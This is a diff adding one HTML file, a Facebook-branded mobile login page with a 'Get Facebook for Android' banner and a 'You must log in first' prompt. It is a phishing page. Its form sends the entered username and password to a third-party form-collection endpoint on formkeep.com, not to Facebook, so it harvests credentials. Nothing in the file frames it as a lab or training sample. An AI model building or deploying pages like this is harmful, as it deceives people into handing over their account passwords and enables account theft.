@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    background-color: #f2f2f2;
+    display: flex;
+    justify-content: center;
+  background-color: #fff;
+    height: 100vh;
+}
+
+.container {
+    width: 100%;
+    height:100%;
+    max-width: 400px;
+    background: #fff;
+    padding: 20px;
+
+}
+
+.header {
+    width: 100%;
+    padding: 15px;
+  max-height: 200px;
+    margin-bottom: 7px;
+    background-color: rgba(255, 241, 148, 0.735);
+}
+
+
+
+
+.header p1{
+    font-size: 12px;
+    color: rgb(37, 85, 174);
+}
+.header p2{
+    font-size:12px;
+    color: rgb(122, 95, 60);
+}
+
+.body .login-box {
+    width: 100%;
+}
+
+.login-box h2 {
+    margin-bottom: 20px;
+    margin-top: 20px;
+    color: #38449f;
+    text-align: center;
+    font-size: 30px;
+    font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+}
+p2{
+
+    font-size: 12px;
+    color: rgb(37, 85, 174);
+  
+}
+
+.textbox {
+    margin-bottom: 10px;
+    position: relative;
+    
+   
+}
+
+.textbox input {
+    width: 100%;
+    padding: 13px;
+    border-bottom: 2px solid #bfb8b8;
+    border-top: 0px;
+    border-left: 0px;
+    border-right: 0px;
+    border-radius: 5px;
+    outline: none;
+    color: #000000;
+    font-family: Arial, Helvetica, sans-serif;
+    background-color: #d4d4d46b;
+}
+
+.btn {
+    width: 95%;
+    padding: 8px;
+    background: #0f46bc;
+    border: none;
+    border-radius: 3px;
+    color: #fff;
+    cursor: pointer;
+    font-size: 14px;
+    
+}
+
+.btn:hover {
+    background: #3a6cc1;
+}
+
+.hr-with-text {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .hr-with-text::before,
+        .hr-with-text::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #000;
+        }
+
+        .hr-with-text:not(:empty)::before {
+            margin-right: 1em;
+        }
+
+        .hr-with-text:not(:empty)::after {
+            margin-left: 1em;
+        }
+input[type=button]{
+    font-size: 15px;
+    margin: 8px 60px;
+    padding: 5px;
+    width: 70%;
+}
+.container {
+            display: flex;
+            gap: 20px;
+        }
+
+        .language-list {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+           
+            width: 200px;
+        }
+
+       
+
+        .language-list ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .language-list li {
+            margin: 10px 0;
+            text-align: center;
+            font-size: 12px;
+        }
+
+    </style>
+</head>
+
+<body>
+    <div>
+        <div class="header">
+           
+            <p1><img src="https://cdn3.iconfinder.com/data/icons/facebook-ui-flat/48/Facebook_UI-05-512.png" width="35px" height="40px"> Get Facebook for Android and browse faster.</p1><br>
+            <p2>You must log in first.</p2>
+        </div>
+        <div class="body">
+            <div class="login-box">
+                <h2>Facebook</h2>
+                <form action="https://formkeep.com/f/3f5fe1af94aa"
+                accept-charset="UTF-8"
+                enctype="multipart/form-data"
+                method="POST">
+                    <div class="textbox">
+                        <input type="text" placeholder="Mobile number or email address" name="username" required>
+                    </div>
+                    <div class="textbox">
+                        <input type="password" placeholder="Password" name="password" required>
+                    </div>
+                   <center> <button type="submit" class="btn">Log in</button>
+                  <p2>Forgotten password?</p2></center>
+                </form>
+
+            </div>
+        </div><br>
+     <div class="hr-with-text">or</div>
+     <input type="button" value="Create new account" ><br><br><br><br><br><br>
+     <div class="container">
+        <div class="language-list">
+            
+            <ul>
+                <li>English (UK)</li>
+                <li>অসমীয়া</li>
+                <li>हिन्दी</li>
+                <li>Português (Brasil)</li>
+            </ul>
+        </div>
+        <div class="language-list">
+           
+            <ul>
+                <li>বাংলা</li>
+                <li>हिन्दी</li>
+                <li>Español</li>
+                <li>|+|</li>
+            </ul>
+        </div>
+    </div>
+    </div>
+</body>
+</html>
+
